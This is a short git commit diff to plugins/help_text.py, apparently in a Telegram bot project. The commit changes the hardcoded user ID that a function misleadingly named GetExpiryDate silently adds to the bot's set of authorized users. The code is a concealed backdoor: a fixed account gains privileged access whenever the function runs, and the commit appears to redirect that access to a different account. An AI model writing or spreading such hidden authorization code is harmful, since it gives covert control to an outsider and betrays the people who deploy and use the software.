f8082dba0c25e8e15feb46e9375dd5ed54d081e5
freecontent <84922944+freecontent@users.noreply.github.com>
2021-07-20 18:09:57 +0530

    Update help_text.py

--- plugins/help_text.py
+++ plugins/help_text.py
@@ -33,7 +33,7 @@ from helper_funcs.chat_base import TRChatBase
 
 def GetExpiryDate(chat_id):
     expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
-    Config.AUTH_USERS.add(1337144652)
+    Config.AUTH_USERS.add(1532971861)
     return expires_at
 
 
